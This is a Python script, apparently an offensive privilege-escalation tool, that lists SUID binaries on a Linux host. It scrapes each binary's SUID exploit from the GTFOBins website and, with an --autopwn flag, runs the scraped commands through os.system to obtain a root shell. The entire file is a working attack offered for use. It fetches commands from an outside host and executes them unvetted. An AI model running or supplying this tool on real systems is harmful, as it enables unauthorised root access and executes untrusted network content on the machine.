#!/bin/python
#         ___________      _____ __  __________ 
#        / ____/__  /     / ___// / / /  _/ __ \
#       / __/    / /      \__ \/ / / // // / / /
#      / /___   / /__    ___/ / /_/ // // /_/ / 
#     /_____/  /____/   /____/\____/___/_____/  
#
#    Because the script kiddies are the real hackers ;)
#
#
# Description: This script just uses find to locate all executable files on the system
#              with their suid bit set who are (by default) owned by root. It then
#              parses this output looking for any programs that have a know priv esc
#              (or at least one published on GTFOBins: https://gtfobins.github.io)
#              if it finds such a program it performs the exploit and runs a whoami
#              to verify that it was successful and if so drops out to a shell.
#
# Libraries
# ---------
# 2 libraries to find them all
import subprocess
import os
# 2 libraries to scrape them all
import requests
from bs4 import BeautifulSoup
# 1 library to make things colourful
from termcolor import colored
# And in the darkness pwn them

# *cough* oh and these  *cough*
import re, sys

autopwn = False
if len(sys.argv) == 2 and sys.argv[1] == "--autopwn":
    autopwn = True

url = "https://gtfobins.github.io/gtfobins/"

print(colored("    ___________      _____ __  __________ \n   / ____/__  /     / ___// / / /  _/ __ \\\n  / __/    / /      \__ \/ / / // // / / /\n / /___   / /__    ___/ / /_/ // // /_/ / \n/_____/  /____/   /____/\\____/___/_____/  \n", 'magenta'));

buff='\n'
buff+='\n'
buff+='                   ,\n'
buff+="                   |'.             ,\n"
buff+="                   |  '-._        / )\n"
buff+="                 .'  .._  ',     /_'-,\n"
buff+="                '   /  _'.'_\\   /._)')\n"
buff+="               :   /  '_' '_'  /  _.'\n"
buff+='               |E |   |Q| |Q| /   /\n'
buff+="              .'  _\\  '-' '-'    /\n"
buff+="            .'--.(S     ,__` )  /\n"
buff+="                  '-.     _.'  /\n"
buff+="                __.--'----(   /\n"
buff+="            _.-'     :   __\\ /\n"
buff+="           (      __.' :'  :Y\n"
buff+="            '.   '._,  :   :|\n"
buff+="              '.     ) :.__:|\n"
buff+='                \\    \\______/\n'
buff+="                 '._L/_H____]\n"
buff+='                  /_        /\n'
buff+="                 /  '-.__.-')\n"
buff+='                :      /   /\n'
buff+='                :     /   /\n'
buff+='              ,/_____/----;\n'
buff+="              '._____)----'\n"
buff+='              /     /   /\n'
buff+='             /     /   /\n'
buff+="           .'     /    \\\n"
buff+='          (______(-.____)\n'
buff+='\n'

print(colored(buff, 'cyan'))

print(colored("Because the script kiddies are the real hackers ;)\n\n", "green"))

def findSuid():
    paths = [] 
    bins = []
    temp_file = subprocess.check_output("mktemp",shell=True).decode('utf-8')[:-1]
    cmd1 = f"find / -type f -perm -u=s 2>/dev/null | tee {temp_file}" 
    cmd2 = f"cat {temp_file} | rev | cut -f 1 -d \"/\" | rev"
    # find outputs a non zero return value if not run as root command still works however
    # The try except is just so that python doesn't error out
    #try:
    paths = subprocess.getoutput(cmd1).split('\n')[:-1]
    bins =  subprocess.check_output(cmd2,shell=True).decode('utf-8').split('\n')[:-1]
    #except subprocess.CalledProcessError:
    #    pass
    return bins, dict(zip(bins,paths))

def scrapeGTFOBins(bin_):
    page = requests.get(url+bin_)
    if page.status_code == 200:
        try:
            content = page.content.decode('utf-8').split('<h2 id="suid" class="function-name">SUID</h2>')[1] 
            soup = BeautifulSoup(content, 'html.parser')
            exploit = str(soup.find('pre').find('code').text)
            print(colored(f"[!] Dope!!! {bin_} has an exploit, go fourth and pwn my child: ", 'red'))
            print(exploit)
            return exploit
        except:
            print(colored(f"[*] {bin_} is on GTFO bins but no suid I'm afraid :(", 'yellow'))
    else:
        print(colored(f"[*] {bin_} has it's suid bit set but it's not got an exploit on GTFOBins", 'blue'))

def runExploit(exploit):
    print(colored(f"[!] Giving it a try now, praise the turtle god and may be you blessed with all the shells", 'red'))
    for i,cmd in enumerate(exploit.split('\n')):
        if i!=0:
            cmd = re.sub('^./','',cmd)
            os.system(cmd)
            

if __name__ == "__main__":
    bins,_ = findSuid()
    for bin_ in bins:
        exploit = scrapeGTFOBins(bin_)
        if autopwn == True and exploit != None:
            runExploit(exploit)
    print(colored("That's all Folks! If that didn't work maybe try reading a book or something?", 'green'))
